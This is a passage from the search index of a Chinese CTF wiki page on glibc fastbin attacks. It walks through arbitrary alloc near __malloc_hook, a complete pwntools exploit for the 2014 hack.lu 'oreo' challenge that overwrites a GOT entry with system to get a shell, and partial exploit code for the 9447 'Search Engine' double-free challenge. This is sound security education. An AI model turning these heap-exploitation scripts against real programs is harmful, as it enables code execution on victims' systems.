\u7684\u5730\u5740\uff0c\u4e8e\u662f\u6211\u4eec\u5411\u4e0a\u5bfb\u627e\u662f\u5426\u53ef\u4ee5\u9519\u4f4d\u51fa\u4e00\u4e2a\u5408\u6cd5\u7684size\u57df\u3002\u56e0\u4e3a\u8fd9\u4e2a\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u56e0\u6b64 fastbin \u7684\u8303\u56f4\u4e3a32\u5b57\u8282\u5230128\u5b57\u8282(0x20-0x80)\uff0c\u5982\u4e0b\uff1a //\u8fd9\u91cc\u7684size\u6307\u7528\u6237\u533a\u57df\uff0c\u56e0\u6b64\u8981\u5c0f2\u500dSIZE_SZ Fastbins[idx=0, size=0x10] Fastbins[idx=1, size=0x20] Fastbins[idx=2, size=0x30] Fastbins[idx=3, size=0x40] Fastbins[idx=4, size=0x50] Fastbins[idx=5, size=0x60] Fastbins[idx=6, size=0x70] \u901a\u8fc7\u89c2\u5bdf\u53d1\u73b0 0x7ffff7dd1af5 \u5904\u53ef\u4ee5\u73b0\u5b9e\u9519\u4f4d\u6784\u9020\u51fa\u4e00\u4e2a0x000000000000007f 0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1af5 <_IO_wide_data_0+309>: 0x000000000000007f \u56e0\u4e3a 0x7f \u5728\u8ba1\u7b97 fastbin index \u65f6\uff0c\u662f\u5c5e\u4e8e index 5 \u7684\uff0c\u5373 chunk \u5927\u5c0f\u4e3a 0x70 \u7684\u3002 ##define fastbin_index(sz) \\ ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) \uff08\u6ce8\u610fsz\u7684\u5927\u5c0f\u662funsigned int\uff0c\u56e0\u6b64\u53ea\u53604\u4e2a\u5b57\u8282\uff09 \u800c\u5176\u5927\u5c0f\u53c8\u5305\u542b\u4e86 0x10 \u7684 chunk_header\uff0c\u56e0\u6b64\u6211\u4eec\u9009\u62e9\u5206\u914d 0x60 \u7684 fastbin\uff0c\u5c06\u5176\u52a0\u5165\u94fe\u8868\u3002 \u6700\u540e\u7ecf\u8fc7\u4e24\u6b21\u5206\u914d\u53ef\u4ee5\u89c2\u5bdf\u5230 chunk \u88ab\u5206\u914d\u5230 0x7ffff7dd1afd\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 malloc_hook\u7684\u5185\u5bb9(\u5728\u6211\u7684libc\u4e2d realloc_hook\u4e0e__malloc_hook\u662f\u5728\u8fde\u5728\u4e00\u8d77\u7684)\u3002 0x4005a8 <main+66> call 0x400450 <malloc@plt> \u2192 0x4005ad <main+71> mov QWORD PTR [rbp-0x8], rax $rax : 0x7ffff7dd1afd 0x7ffff7dd1aed <_IO_wide_data_0+301>: 0xfff7dd0260000000 0x000000000000007f 0x7ffff7dd1afd: 0xfff7a92e20000000 0xfff7a92a0000007f 0x7ffff7dd1b0d <__realloc_hook+5>: 0x000000000000007f 0x0000000000000000 0x7ffff7dd1b1d: 0x0000000000000000 0x0000000000000000","title":"\u6f14\u793a"},{"location":"pwn/heap/fastbin_attack/#_14","text":"Arbitrary Alloc \u5728 CTF \u4e2d\u7528\u5730\u66f4\u52a0\u9891\u7e41\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5b57\u8282\u9519\u4f4d\u7b49\u65b9\u6cd5\u6765\u7ed5\u8fc7 size \u57df\u7684\u68c0\u9a8c\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d chunk\uff0c\u6700\u540e\u7684\u6548\u679c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u3002","title":"\u5c0f\u603b\u7ed3"},{"location":"pwn/heap/fastbin_attack/#2014-hacklu-oreo","text":"","title":"2014 hack.lu oreo"},{"location":"pwn/heap/fastbin_attack/#_15","text":"\u279c 2014_Hack.lu_oreo git: ( master ) file oreo oreo: ELF 32 -bit LSB executable, Intel 80386 , version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2 .6.26, BuildID [ sha1 ]= f591eececd05c63140b9d658578aea6c24450f8b, stripped \u279c 2014_Hack.lu_oreo git: ( master ) checksec oreo [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo' Arch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u786e\u5b9e\u662f\u6bd4\u8f83\u8001\u7684\uff0c32\u4f4d\u7a0b\u5e8f\uff0c\u52a8\u6001\u94fe\u63a5\uff0c\u5c31\u8fde RELRO \u6280\u672f\u4e5f\u6ca1\u6709\u4e0a\u3002","title":"\u57fa\u672c\u5206\u6790"},{"location":"pwn/heap/fastbin_attack/#_16","text":"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u5e76\u6ca1\u6709\u8fdb\u884c setvbuf \u64cd\u4f5c\uff0c\u56e0\u6b64\u5728\u521d\u6b21\u6267\u884c io \u51fd\u6570\u65f6\uff0c\u4f1a\u5728\u5806\u4e0a\u5206\u914d\u7a7a\u95f4\u3002 \u6b63\u5982\u7a0b\u5e8f\u4e2d\u76f4\u63a5\u8f93\u51fa\u7684\u4fe1\u606f\uff0c\u7a0b\u5e8f\u4e3b\u8981\u662f\u4e00\u4e2a\u539f\u59cb\u7684\u5728\u7ebf\u67aa\u652f\u7cfb\u7edf\u3002\u5176\u4e2d\uff0c\u6839\u636e\u6dfb\u52a0\u67aa\u652f\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u67aa\u652f\u7684\u57fa\u672c\u7ed3\u6784\u5982\u4e0b 00000000 rifle struc ; ( sizeof = 0x38 , mappedto_5 ) 00000000 descript db 25 dup ( ? ) 0000001 9 name db 27 dup ( ? ) 00000034 next dd ? ; offset 0000003 8 rifle ends \u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u5982\u4e0b \u6dfb\u52a0\u67aa\u652f\uff0c\u5176\u4e3b\u8981\u4f1a\u8bfb\u53d6\u67aa\u652f\u7684\u540d\u5b57\u4e0e\u63cf\u8ff0\u3002\u4f46\u95ee\u9898\u5728\u4e8e\u8bfb\u53d6\u7684\u540d\u5b57\u7684\u957f\u5ea6\u8fc7\u957f\uff0c\u53ef\u4ee5\u8986\u76d6 next \u6307\u9488\u4ee5\u53ca\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u3002\u53ef\u4ee5\u8986\u76d6\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u5927\u5c0f\u4e3a 56-(56-27)=27 \u5927\u5c0f\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e9b\u67aa\u652f\u7684\u5927\u5c0f\u90fd\u662f\u5728fastbin \u8303\u56f4\u5185\u7684\u3002 \u5c55\u793a\u6dfb\u52a0\u67aa\u652f\uff0c\u5373\u4ece\u5934\u5230\u5c3e\u8f93\u51fa\u67aa\u652f\u7684\u63cf\u8ff0\u4e0e\u540d\u5b57\u3002 \u8ba2\u5df2\u7ecf\u9009\u62e9\u7684\u67aa\u652f\uff0c\u5373\u5c06\u6240\u6709\u5df2\u7ecf\u6dfb\u52a0\u7684\u67aa\u652f\u91ca\u653e\u6389\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u7f6e\u4e3aNULL\u3002 \u7559\u4e0b\u8ba2\u8d27\u6d88\u606f \u5c55\u793a\u76ee\u524d\u72b6\u6001\uff0c\u5373\u6dfb\u52a0\u4e86\u591a\u5c11\u53ea\u67aa\uff0c\u8ba2\u4e86\u591a\u5c11\u5355\uff0c\u7559\u4e0b\u4e86\u4ec0\u4e48\u4fe1\u606f\u3002 \u4e0d\u96be\u5206\u6790\u5f97\u5230\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u4e3b\u8981\u5b58\u5728\u4e8e\u6dfb\u52a0\u67aa\u652f\u65f6\u7684\u5806\u6ea2\u51fa\u6f0f\u6d1e\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"pwn/heap/fastbin_attack/#_17","text":"\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u7531\u4e8e\u7a0b\u5e8f\u5b58\u5728\u5806\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u63a7\u5236 next \u6307\u9488\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 next \u6307\u9488\u6307\u5411\u7a0b\u5e8f\u4e2d got \u8868\u7684\u4f4d\u7f6e\u3002\u5f53\u8fdb\u884c\u5c55\u793a\u7684\u65f6\u5019\uff0c\u5373\u53ef\u4ee5\u8f93\u51fa\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u540c\u65f6\u9700\u8981\u786e\u4fdd\u5047\u8bbe\u5bf9\u5e94\u5730\u5740\u4e3a\u4e00\u4e2a\u67aa\u652f\u7ed3\u6784\u4f53\u65f6\uff0c\u5176 next \u6307\u9488\u4e3a NULL\u3002\u8fd9\u91cc\u6211\u91c7\u7528 puts@got\u3002\u901a\u8fc7\u8fd9\u6837\u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97\u51fa libc \u57fa\u5730\u5740\uff0c\u4ee5\u53ca system \u51fd\u6570\u5730\u5740\u3002 \u7531\u4e8e\u67aa\u652f\u7ed3\u6784\u4f53\u5927\u5c0f\u662f 0x38 \u5927\u5c0f\uff0c\u6240\u4ee5\u5176\u5bf9\u5e94\u7684 chunk \u4e3a 0x40\u3002\u8fd9\u91cc\u91c7\u7528 house of sprit \u7684\u6280\u672f\u6765\u8fd4\u56de 0x0804A2A8 \u5904\u7684chunk\uff0c\u5373\u7559\u4e0b\u7684\u6d88\u606f\u7684\u6307\u9488\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u7f6e 0x0804A2A4 \u5904\u7684\u5185\u5bb9\u4e3a 0x40\uff0c\u5373\u9700\u8981\u6dfb\u52a0 0x40 \u652f\u67aa\u652f\uff0c\u4ece\u800c\u7ed5\u8fc7\u5927\u5c0f\u68c0\u6d4b\u3002\u540c\u65f6\u4e3a\u4e86\u786e\u4fdd\u53ef\u4ee5\u7ed5\u8fc7 next chunk \u7684\u68c0\u6d4b\uff0c\u8fd9\u91cc\u6211\u4eec\u7f16\u8f91\u7559\u4e0b\u7684\u6d88\u606f\u3002 \u5728\u6210\u529f\u5206\u914d\u8fd9\u6837\u7684 chunk \u540e\uff0c\u6211\u4eec\u5176\u5b9e\u5c31\u6709\u4e86\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u4fee\u6539\u7684\u6f0f\u6d1e\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u4fee\u6539\u4e00\u4e2a\u5408\u9002\u7684 got \u9879\u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u83b7\u5f97 shell\u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b from pwn import * context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' context . binary = \"./oreo\" oreo = ELF ( \"./oreo\" ) if args [ 'REMOTE' ]: p = remote ( ip , port ) else : p = process ( \"./oreo\" ) log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) libc = ELF ( './libc.so.6' ) def add ( descrip , name ): p . sendline ( '1' ) #p.recvuntil('Rifle name: ') p . sendline ( name ) #p.recvuntil('Rifle description: ') #sleep(0.5) p . sendline ( descrip ) def show_rifle (): p . sendline ( '2' ) p . recvuntil ( '=================================== \\n ' ) def order (): p . sendline ( '3' ) def message ( notice ): p . sendline ( '4' ) #p.recvuntil(\"Enter any notice you'd like to submit with your order: \") p . sendline ( notice ) def exp (): print 'step 1. leak libc base' name = 27 * 'a' + p32 ( oreo . got [ 'puts' ]) add ( 25 * 'a' , name ) show_rifle () p . recvuntil ( '=================================== \\n ' ) p . recvuntil ( 'Description: ' ) puts_addr = u32 ( p . recvuntil ( ' \\n ' , drop = True )[: 4 ]) log . success ( 'puts addr: ' + hex ( puts_addr )) libc_base = puts_addr - libc . symbols [ 'puts' ] system_addr = libc_base + libc . symbols [ 'system' ] binsh_addr = libc_base + next ( libc . search ( '/bin/sh' )) print 'step 2. free fake chunk at 0x0804A2A8' # now, oifle_cnt=1, we need set it = 0x40 oifle = 1 while oifle < 0x3f : # set next link=NULL add ( 25 * 'a' , 'a' * 27 + p32 ( 0 )) oifle += 1 payload = 'a' * 27 + p32 ( 0x0804a2a8 ) # set next link=0x0804A2A8, try to free a fake chunk add ( 25 * 'a' , payload ) # before free, we need to bypass some check # fake chunk's size is 0x40 # 0x20 *'a' for padding the last fake chunk # 0x40 for fake chunk's next chunk's prev_size # 0x100 for fake chunk's next chunk's size # set fake iofle' next to be NULL payload = 0x20 * ' \\x00 ' + p32 ( 0x40 ) + p32 ( 0x100 ) payload = payload . ljust ( 52 , 'b' ) payload += p32 ( 0 ) payload = payload . ljust ( 128 , 'c' ) message ( payload ) # fastbin 0x40: 0x0804A2A0->some where heap->NULL order () p . recvuntil ( 'Okay order submitted! \\n ' ) print 'step 3. get shell' # modify free@got to system addr payload = p32 ( oreo . got [ 'strlen' ]) . ljust ( 20 , 'a' ) add ( payload , 'b' * 20 ) log . success ( 'system addr: ' + hex ( system_addr )) #gdb.attach(p) message ( p32 ( system_addr ) + ';/bin/sh \\x00 ' ) p . interactive () if __name__ == \"__main__\" : exp () \u5f53\u7136\uff0c\u8be5\u9898\u76ee\u4e5f\u53ef\u4ee5\u4f7f\u7528 fast bin attack \u4e2d\u7684\u5176\u5b83\u6280\u672f\u6765\u5b9e\u73b0\uff0c\u53ef\u53c2\u8003\u53c2\u8003\u6587\u732e\u4e2d\u7684\u94fe\u63a5\u3002","title":"\u5229\u7528"},{"location":"pwn/heap/fastbin_attack/#2015-9447-ctf-search-engine","text":"","title":"2015 9447 CTF : Search Engine"},{"location":"pwn/heap/fastbin_attack/#_18","text":"\u279c 2015_9447ctf_search-engine git: ( master ) file search search: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped \u279c 2015_9447ctf_search-engine git: ( master ) checksec search [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) FORTIFY: Enabled","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"pwn/heap/fastbin_attack/#_19","text":"\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u662f \u7d22\u5f15\u4e00\u4e2a\u53e5\u5b50 \u5927\u5c0fv0\uff0c(unsigned int)(v0 - 1) > 0xFFFD \u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u548c\u7ed9\u5b9a\u7684\u5927\u5c0f\u76f8\u7b49 \u6bcf\u6b21\u7d22\u5f15\u7684\u53e5\u5b50\u90fd\u662f\u76f4\u63a5\u5728\u76f4\u63a5\u5efa\u7acb\u5728\u524d\u9762\u7684\u53e5\u5b50\u4e0a\u7684\u3002 \u5728\u4e00\u4e2a\u53e5\u5b50\u4e2d\u641c\u7d22\u5355\u8bcd \u5927\u5c0fv0\uff0c(unsigned int)(v0 - 1) > 0xFFFD \u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5b57\u7b26\u4e32 \u5982\u679c\u6709\u56de\u8f66\u6807\u8bb0 \u5728\u6307\u5b9a\u957f\u5ea6\u5185\u6ca1\u6709\u9047\u5230\u56de\u8f66\uff0c\u5219\u8bfb\u5b8c\u6ca1\u6709\u8bbe\u7f6eNULL\u6807\u8bb0 \u5728\u6307\u5b9a\u957f\u5ea6\u5185\u9047\u5230\u56de\u8f66\uff0c\u5c31\u622a\u65ad\u8fd4\u56de\u3002 \u6ca1\u6709\u56de\u8f66\u6807\u8bb0 \u8bfb\u591f\u6307\u5b9a\u957f\u5ea6\uff0c\u6ca1\u6709NULL\u6807\u8bb0\u7ed3\u5c3e\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"pwn/heap/fastbin_attack/#_20","text":"\u901a\u8fc7\u5206\u6790\u7d22\u5f15\u53e5\u5b50\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8bcd\u8bed\u7684\u7ed3\u6784\u5982\u4e0b 00000000 word_struct struc ; (sizeof=0x28, mappedto_6) 00000000 content dq ? 00000008 size dd ? 0000000C padding1 dd ? 00000010 sentence_ptr dq ? ; offset 00000018 len dd ? 0000001C padding2 dd ? 00000020 next dq ? ; offset 00000028 word_struct ends","title":"\u8bcd\u8bed\u7ed3\u6784\u4f53"},{"location":"pwn/heap/fastbin_attack/#_21","text":"\u5206\u914d malloc 40 \u5b57\u8282\u4e3a\u4e00\u4e2aword\u7ed3\u6784\u4f53 \u4e3a\u53e5\u5b50\u6216\u8005\u5355\u8bcd malloc \u6307\u5b9a\u5927\u5c0f\u3002 \u91ca\u653e \u91ca\u653e\u5220\u9664\u7684\u53e5\u5b50 \u91ca\u653e\u5220\u9664\u53e5\u5b50\u6240\u641c\u7d22\u7684\u4e34\u65f6\u5355\u8bcd \u91ca\u653e\u7d22\u5f15\u53e5\u5b50\u65f6\u672a\u4f7f\u7528\u7684\u5355\u8bcd\u7ed3\u6784","title":"\u5806\u5185\u5b58\u76f8\u5173\u64cd\u4f5c"},{"location":"pwn/heap/fastbin_attack/#_22","text":"\u7d22\u5f15\u53e5\u5b50\u8bfb\u53d6\u5b57\u7b26\u4e32\u65f6\u65e0NULL\u7ed3\u5c3e \u5728\u7d22\u5f15\u53e5\u5b50\u65f6 flag_enter \u6c38\u8fdc\u4e3a 0\uff0c\u6240\u4ee5\u8bfb\u53d6\u53e5\u5b50\u65f6\u6700\u540e\u6ca1\u6709 NULL \u7ed3\u5c3e\u3002 _flag_enter = flag_enter ; v4 = 0 ; while ( 1 ) { v5 = & s [ v4 ]; v6 = fread ( & s [ v4 ], 1uLL , 1uLL , stdin ); if ( v6 <= 0 ) break ; if ( * v5 == '\\n' && _flag_enter ) { if ( v4 ) { * v5 = 0 ; return ; } v4 = v6 - 1 ; if ( len <= v6 - 1 ) break ; } else { v4 += v6 ; if ( len <= v4 ) break ; } } \u8bfb\u53d6\u9009\u62e9\u64cd\u4f5c\u6570 __int64 read_num () { __int64 result ; // rax char * endptr ; // [rsp+8h] [rbp-50h] char nptr ; // [rsp+10h] [rbp-48h] unsigned __int64 v3 ; // [rsp+48h] [rbp-10h] v3 = __readfsqword ( 0x28u ); read_str ( & nptr , 48 , 1 ); result = strtol ( & nptr , & endptr , 0 ); if ( endptr == & nptr ) { __printf_chk ( 1LL , \"%s is not a valid number \\n \" , & nptr ); result = read_num (); } __readfsqword ( 0x28u ); return result ; } \u56e0\u4e3a read_str \u4e0d\u8bbe\u7f6eNULL \uff0c\u56e0\u6b64\uff0c\u5982\u679c nptr \u8bfb\u53d6\u7684\u4e0d\u5408\u6cd5\u7684\u8bdd\uff0c\u5c31\u6709\u53ef\u80fd\u4f1a leak \u51fa\u6808\u4e0a\u7684\u5185\u5bb9\u3002 \u7d22\u5f15\u53e5\u5b50\u91ca\u653e\u672a\u7f6eNULL else { free ( v6 ); } \u641c\u7d22\u8bcd\u8bed\u4e2d\u5220\u9664\u8bcd\u8bed\u65f6\uff0c\u5bf9\u5e94\u53e5\u5b50\u6307\u9488\u53ea\u662f\u91ca\u653e\uff0c\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL for ( i = head ; i ; i = i -> next ) { if ( * i -> sentence_ptr ) { if ( LODWORD ( i -> size ) == v0 && ! memcmp (( const void * ) i -> content , v1 , v0 ) ) { __printf_chk ( 1LL , \"Found %d: \" , LODWORD ( i -> len )); fwrite ( i -> sentence_ptr , 1uLL , SLODWORD ( i -> len ), stdout ); putchar ( '\\n' ); puts ( \"Delete this sentence (y/n)?\" ); read_str ( & choice , 2 , 1 ); if ( choice == 'y' ) { memset ( i -> sentence_ptr , 0 , SLODWORD ( i -> len )); free ( i -> sentence_ptr ); puts ( \"Deleted!\" ); } } } } free ( v1 ); \u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u6bcf\u6b21\u91ca\u653e i->sentence_ptr \u4e4b\u524d\uff0c\u8fd9\u4e2a\u53e5\u5b50\u7684\u5185\u5bb9\u5c31\u4f1a\u5168\u90e8\u88ab\u8bbe\u7f6e\u4e3a \\x00 \uff0c\u7531\u4e8e\u5355\u8bcd\u7ed3\u6784\u4f53\u4e2d\u5b58\u50a8\u7684\u5355\u8bcd\u53ea\u662f\u53e5\u5b50\u7684\u4e00\u4e2a\u6307\u9488\uff0c\u6240\u4ee5\u5355\u8bcd\u4e5f\u4f1a\u88ab\u7f6e\u4e3a \\x00 \u3002\u8be5\u53e5\u5b50\u5bf9\u5e94\u7684\u90a3\u4e9b\u5355\u8bcd\u4ecd\u7136\u662f\u5b58\u5728\u4e8e\u94fe\u8868\u4e2d\u7684\uff0c\u5e76\u6ca1\u6709\u88ab\u5220\u9664\uff0c\u56e0\u6b64\u6bcf\u6b21\u641c\u7d22\u5355\u8bcd\u7684\u65f6\u5019\uff0c\u4ecd\u7136\u4f1a\u5224\u65ad\u3002\u770b\u8d77\u6765\u7531\u4e8e\u53e5\u5b50\u5185\u5bb9\u88ab\u7f6e\u4e3a \\x00 \u53ef\u4ee5\u9632\u6b62\u901a\u8fc7 *i->sentence_ptr \u9a8c\u8bc1\u3002\u7136\u800c\uff0c\u7531\u4e8e chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u653e\u5230 bin \u4e2d\uff0c\u5f53 chunk \u4e0d\u662f fastbin \u6216\u8005 chunk \u88ab\u91cd\u65b0\u5206\u914d\u51fa\u53bb\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u4e5f\u5c31\u6709\u53ef\u80fd\u4f1a\u4ea7\u751f double free \u7684\u60c5\u51b5\u3002\u6b64\u5916\uff0c\u5f53\u53e5\u5b50\u88ab memset \u7684\u65f6\u5019\uff0c\u5355\u8bcd\u867d\u7136\u90fd\u53d8\u4e3a\u4e86 \\x00 \uff0c\u4f46\u662f\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u4e24\u4e2a \\x00 \u7684\u6bd4\u8f83\u6765\u7ed5\u8fc7 memcmp \u7684\u68c0\u6d4b\u3002","title":"\u6f0f\u6d1e"},{"location":"pwn/heap/fastbin_attack/#_23","text":"","title":"\u5229\u7528"},{"location":"pwn/heap/fastbin_attack/#_24","text":"\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528 unsorted bin \u5730\u5740\u6cc4\u6f0f libc \u57fa\u5730\u5740 \u5229\u7528 double free \u6784\u9020 fastbin \u5faa\u73af\u94fe\u8868 \u5206\u914d chunk \u5230 malloc_hook \u9644\u8fd1\uff0c\u4fee\u6539malloc_hook \u4e3a one_gadget","title":"\u5229\u7528\u601d\u8def"},{"location":"pwn/heap/fastbin_attack/#libc","text":"\u8fd9\u91cc\u6211\u4eec\u5206\u914d\u4e00\u4e2a small bin \u5927\u5c0f\u7684 chunk \uff0c\u5f53\u5b83\u88ab\u91ca\u653e\u540e\uff0c\u5c31\u4f1a\u653e\u5165\u5230 unsorted bin \u4e2d\u3002\u56e0\u800c\uff0c\u53ea\u8981 unsorted bin \u7684\u5730\u5740\u7684\u8d77\u59cb\u5b57\u8282\u4e0d\u662f \\x00 \u4fbf\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020 \\x00 \u6765\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u800c\u901a\u8fc7\u9a8c\u8bc1\u3002\u5177\u4f53\u5982\u4e0b def leak_libc (): smallbin_sentence = 's' * 0x85 + ' m ' index_sentence ( smallbin_sentence ) search_word ( 'm' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) search_word ( ' \\x00 ' ) p . recvuntil ( 'Found ' + str ( len ( smallbin_sentence )) + ': ' ) unsortedbin_addr = u64 ( p . recv ( 8 )) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'n' ) return unsortedbin_addr","title":"\u6cc4\u6f0f libc \u5730\u5740"},{"location":"pwn/heap/fastbin_attack/#fastbin","text":"\u7531\u4e8e\u6211\u4eec\u6700\u540e\u5e0c\u671b\u5728 malloc_hook \u5904\u5206\u914d chunk\uff0c\u800c\u4e00\u822c\u5206\u914d malloc_hook \u9644\u8fd1\u7684 chunk \u4e00\u822c\u5927\u5c0f\u90fd\u662f0x7f\u3002\u5373\uff0c\u6211\u4eec\u6240\u9700\u8981\u8bbe\u7f6e\u7684\u8bbe\u7f6e\u7684 fast bin \u7684\u6570\u636e\u5b57\u8282\u90e8\u5206\u7684\u5927\u5c0f\u4e3a 0x60\u3002\u8fd9\u91cc\u6211\u4eec\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u6784\u9020 \u5206\u522b\u7d22\u5f15\u53e5\u5b50a\uff0c\u7d22\u5f15\u53e5\u5b50b\uff0c\u7d22\u5f15\u53e5\u5b50c\uff0c\u5219\u6b64\u65f6\u5355\u8bcd\u94fe\u8868\u4e2d\u7d22\u5f15\u7684\u53e5\u5b50\u7684\u76f8\u5bf9\u987a\u5e8f\u4e3ac->b->a\u3002\u5047\u8bbe\u53e5\u5b50 a \u4e3a'a' * 0x5d+' d '\uff0c\u53e5\u5b50 b \u4e3a 'b' * 0x5d+' d '\uff0c\u53e5\u5b50c\u7c7b\u4f3c\u3002 \u7d22\u5f15\u5355\u8bcdd\uff0c\u4e09\u4e2a\u5747\u5220\u9664\uff0c\u5219\u6b64\u65f6 fastbin \u4e2d\u7684\u94fe\u8868\u60c5\u51b5\u4e3a a->b->c->NULL\uff0c\u8fd9\u662f\u56e0\u4e3a\u9996\u5148\u91ca\u653e\u7684\u662f\u53e5\u5b50c\uff0c\u6700\u540e\u91ca\u653e\u7684\u662f\u53e5\u5b50 a \u3002\u8fd9\u65f6\uff0c\u641c\u7d22\u5355\u8bcd\u65f6 *i->sentence_ptr \u5bf9\u4e8ea, b \u6765\u8bf4\u90fd\u662f\u53ef\u4ee5\u7ed5\u8fc7\u7684\u3002 \u6211\u4eec\u6b64\u65f6\u518d\u6b21\u5220\u9664\u641c\u7d22\u5355\u8bcd \\x00 \u3002\u9996\u5148\u904d\u5386\u7684\u662f c\uff0c\u4f46\u662f c \u7684\u9a8c\u8bc1\u4e0d\u901a\u8fc7\uff1b\u5176\u6b21\u904d\u5386\u7684\u662fb\uff0c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u6211\u4eec\u5c06\u5176\u91ca\u653e\uff1b\u5176\u6b21\u904d\u5386\u7684\u662fa\uff0c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u5220\u9664\u3002\u5219\u6b64\u65f6 fastbin \u7684\u60c5\u51b5\u4e3a b->a->b->a->...\u3002\u5373\u5df2\u7ecf\u6784\u6210\u4e86double free b\u7684\u60c5\u51b5\u3002\u7531\u4e8e\u6211\u4eec\u5148\u524d\u4e3a\u4e86 leak libc \u8fd8\u5efa\u7acb\u4e00\u4e2a\u53e5\u5b50\uff0c\u6240\u4ee5\u8fd8\u6709\u4e00\u4e2a\u5355\u8bcd\u53ef\u4ee5\u6bd4\u8f83\uff0c\u8fd9\u91cc\u6211\u4eec\u4e5f\u4e0d\u5220\u9664\u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b # 2. create cycle fastbin 0x70 size index_sentence ( 'a' * 0x5d + ' d ' ) #a index_sentence ( 'b' * 0x5d + ' d ' ) #b index_sentence ( 'c' * 0x5d + ' d ' ) #c # a->b->c->NULL search_word ( 'd' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) # b->a->b->a->... search_word ( ' \\x00 ' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'n' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'n' ) \u6548\u679c\u5982\u4e0b pwndbg> fastbins fastbins 0x20: 0x0 0x30: 0x1d19320 \u25c2\u2014 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x1d191b0 \u2014\u25b8 0x1d19010 \u2014\u25b8 0x1d191b0 \u25c2\u2014 0x1d19010 0x80: 0x0","title":"\u6784\u9020 fastbin \u5faa\u73af\u94fe\u8868"},{"location":"pwn/heap/fastbin_attack/#malloc_hook-chunk","text":"\u6b64\u65f6\uff0cfastbin \u7684\u94fe\u8868\u4e3a 